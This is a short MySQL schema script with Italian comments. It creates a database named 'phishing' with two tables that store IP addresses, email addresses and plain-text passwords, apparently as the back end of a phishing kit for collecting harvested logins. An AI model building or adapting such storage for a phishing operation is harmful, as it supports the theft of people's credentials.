## Crea il database se non esiste
create database if not exists phishing
    CHARACTER SET =  "utf8"
    COLLATE = "utf8_unicode_ci";

## Selezioniamo il database da usare
use phishing;

drop table if exists utenti;
create table utenti (
    ## Valori
    ip NVARCHAR(50) NOT NULL ,
    email NVARCHAR(30) NOT NULL,
    password NVARCHAR(30) NOT NULL
);

drop table if exists inserimenti;
create table inserimenti (
    ## Valori
    ip NVARCHAR(50) NOT NULL ,
    email NVARCHAR(30) NOT NULL,
    password NVARCHAR(30) NOT NULL
)